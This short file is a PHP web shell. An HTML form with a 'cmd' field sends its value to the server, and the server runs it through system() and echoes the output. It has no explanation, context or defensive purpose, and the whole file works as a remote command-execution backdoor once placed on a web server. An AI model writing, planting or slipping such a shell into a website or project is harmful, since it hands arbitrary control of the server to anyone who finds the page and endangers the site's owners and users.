<html>
	<body>
<?php
echo '<form action="">';
echo '<input type=text name=cmd>';
echo '<input type=submit></form><br>';
?>
<pre>
<?php

if(isset($_GET['cmd'])){
	system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
